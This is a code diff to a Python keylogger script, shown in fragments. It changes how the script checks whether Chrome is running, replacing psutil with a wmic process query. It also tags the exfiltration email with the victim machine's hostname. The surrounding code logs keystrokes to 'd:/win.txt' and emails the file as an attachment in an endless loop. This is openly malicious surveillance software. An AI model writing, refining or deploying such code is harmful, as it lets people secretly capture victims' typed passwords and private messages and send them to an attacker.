@@ -4,8 +4,9 @@ from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-import psutil, os
-
+import os
+import re
+import socket
 
 file = "d:/win.txt"
 sender_email = ""
@@ -17,8 +18,8 @@ keys = []
 
 
 def mail2():
-    subject = "An email with attachment from Logger"
-    body = "An email with attachment from Logge"
+    subject = f"Logger {socket.gethostname()}"
+    body = "PFA"
 
     # Create a multipart message and set headers
     message = MIMEMultipart()
@@ -100,14 +101,12 @@ def start_keylogger():
 
 # check if chrome is running
 def checkIfProcessRunning(processName):
-    for proc in psutil.process_iter():
-        try:
-            # Check if process name contains the given name string.
-            if processName.lower() in proc.name().lower():
-                return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-    return False
+    output = os.popen('wmic process get description').read()
+
+    if re.search('chrome', output):
+        return True
+    else:
+        return False
 
 
 while True:
